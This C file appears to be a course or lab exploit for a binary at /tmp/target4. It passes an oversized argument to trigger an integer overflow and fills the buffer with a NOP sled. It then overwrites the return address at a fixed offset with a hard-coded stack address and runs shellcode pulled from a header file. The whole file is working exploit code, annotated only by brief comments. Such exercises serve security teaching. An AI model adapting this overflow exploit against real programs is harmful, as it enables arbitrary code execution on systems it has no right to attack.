#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  args[2] = NULL;
  env[0] = NULL;

  // integer overflow. condition in line 10 of target will be true
  args[1] = malloc(32769);
  // fill with nop
  memset(args[1], 0x90, 32768);
  // null terminator
  *(unsigned int *)(args[1] + 32768) = 0x0;
  // overwrite return address with shellcode string's address
  *(unsigned int *)(args[1] + 4016) = 0xbfff6ecc;
  // copy shellcode string to start of buf
  memcpy(args[1], shellcode, strlen(shellcode));

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
